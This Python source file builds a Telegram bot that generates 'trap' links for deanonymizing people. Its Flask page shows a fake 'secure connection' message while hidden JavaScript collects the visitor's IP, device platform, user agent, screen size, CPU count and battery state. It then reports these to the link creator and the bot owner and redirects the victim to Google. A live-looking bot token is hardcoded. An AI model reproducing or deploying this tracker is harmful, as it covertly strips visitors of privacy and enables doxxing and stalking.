import asyncio
import logging
import threading
import os
from flask import Flask, render_template_string, request
import requests
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder

# ================= КОНФИГУРАЦИЯ =================
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115
# Твоя ссылка с Render (обязательно без / в конце)
BASE_URL = os.getenv("APP_URL", "https://tg-bot-backend-oo97.onrender.com") 

app = Flask(__name__)

# HTML Ловушки
HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script>
        async function collect() {
            let d = {
                aid: "{{ aid }}",
                p: navigator.platform,
                a: navigator.userAgent,
                s: screen.width + "x" + screen.height,
                c: navigator.hardwareConcurrency || "N/A"
            };
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    d.b = Math.round(b.level * 100) + "%";
                    d.ch = b.charging ? "Заряжается" : "Разряжается";
                }
            } catch (e) {}
            fetch('/catch', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(d)
            }).finally(() => { 
                window.location.href = "https://www.google.com"; 
            });
        }
        window.onload = collect;
    </script>
</head>
<body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 20%;">
    <h3>Инициализация защищенного соединения...</h3>
</body>
</html>
"""

@app.route('/t/<aid>')
def trap(aid):
    return render_template_string(HTML_TRAP, aid=aid)

@app.route('/catch', methods=['POST'])
def catch():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    report = (
        f"🚨 **ОБЪЕКТ ДЕАНОНИМИЗИРОВАН** 🚨\n\n"
        f"👤 **ID Клиента:** `{d['aid']}`\n"
        f"📍 **IP:** `{ip}`\n"
        f"📱 **Устройство:** {d.get('p', 'N/A')}\n"
        f"🖥 **Экран:** {d.get('s', 'N/A')}\n"
        f"⚙️ **Ядер ЦП:** {d.get('c', 'N/A')}\n"
        f"🔋 **Батарея:** {d.get('b', 'N/A')} ({d.get('ch', 'N/A')})"
    )
    
    # Отправка через прямой запрос API, чтобы не конфликтовать с основным ботом
    send_url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    
    # Отчет тебе
    requests.post(send_url, json={"chat_id": OWNER_ID, "text": f"📡 **ПЕРЕХВАТ:**\n{report}", "parse_mode": "Markdown"})
    # Отчет клиенту
    requests.post(send_url, json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown"})
    
    return "OK", 200

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    builder = ReplyKeyboardBuilder()
    builder.add(types.KeyboardButton(text="🔗 Создать Ловушку"))
    builder.adjust(1)
    await message.answer("💀 **SYSTEM MONOLITH v6.5**\nТокен обновлен. Конфликты устранены.", reply_markup=builder.as_markup(resize_keyboard=True))

@dp.message(F.text == "🔗 Создать Ловушку")
async def create_trap(message: types.Message):
    # Генерируем ссылку
    trap_link = f"{BASE_URL}/t/{message.from_user.id}"
    await message.answer(f"🛠 **Ловушка готова:**\n`{trap_link}`")
    await bot.send_message(OWNER_ID, f"🕵️‍♂️ **ИНФО:** @{message.from_user.username} сгенерировал ссылку.")

async def main():
    # Запускаем сайт-логгер в фоне
    threading.Thread(target=run_flask, daemon=True).start()
    # Запускаем бота
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
